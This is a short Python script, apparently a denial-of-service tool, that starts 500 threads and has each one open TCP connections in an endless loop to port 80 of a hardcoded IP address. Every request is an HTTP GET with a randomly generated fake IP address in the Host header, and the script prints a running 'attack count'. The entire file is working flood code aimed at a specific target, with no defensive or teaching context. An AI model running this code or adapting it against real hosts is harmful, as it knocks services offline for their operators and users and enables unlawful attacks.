import random
import socket
import threading

target = '44.198.159.30'
port = 80

attack_num = 0

try:
  def SOCattack():
    while True:
      ip1 = str(random.randint(1,254))
      ip2 = str(random.randint(1,254))
      ip3 = str(random.randint(1,254))
      ip4 = str(random.randint(1,254))
      dot = '.'
      fake_ip = ip1 + dot + ip2 + dot + ip3 + dot + ip4
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((target, port))
      s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
      s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
      global attack_num
      attack_num += 1
      print('attack count:',attack_num)
      s.close()
except Exception as e:
  print(e)

for i in range(500):
  try:
    thread = threading.Thread(target=SOCattack)
    thread.start()
  except Exception as e:
    print(e) 
